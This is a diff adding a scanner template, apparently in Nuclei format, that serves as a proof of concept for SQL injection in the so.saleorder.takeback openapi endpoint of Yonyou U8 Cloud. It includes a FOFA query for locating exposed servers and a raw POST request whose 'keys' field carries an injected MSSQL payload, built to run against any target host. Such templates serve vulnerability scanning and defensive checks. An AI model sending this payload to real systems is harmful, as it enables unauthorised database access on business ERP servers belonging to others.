@@ -1,0 +1,19 @@
+id: poc-hwzu3r22eqd4gth3
+info:
+  name: 用友U8 Cloud so.saleorder.takeback存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hwzu3r22eqd4gth3'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hwzu3r22eqd4gth3
+    fofa: app="用友-U8-Cloud"
+http:
+- raw:
+  - "POST /u8cloud/openapi/so.saleorder.takeback?appcode=huo&isEncrypt=N HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 181\n\n{\n    \"pk_proposer\": \"1\",\n    \"operator\": \"1\",\n    \"pk_corp\": \"1\",\n    \"keys\": [\"1'and 1=LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '554'), 2))--\"]\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
